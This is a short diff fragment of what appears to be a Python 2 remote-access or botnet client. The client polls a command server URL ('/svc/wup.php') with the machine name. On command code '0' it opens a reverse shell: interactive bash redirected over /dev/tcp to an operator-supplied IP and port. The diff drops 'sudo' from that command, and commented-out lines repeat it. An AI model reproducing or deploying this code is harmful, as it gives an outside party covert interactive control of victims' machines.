@@ -84,7 +84,7 @@ while True:
 				#httpServ.close()
 				os.system("wait")
 			if skill == '0':
-				p = Popen("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
+				p = Popen("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
 				#sret=subprocess.check_output("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1", shell=True)
 				#os.system("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
 				response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name+"&kill=1")
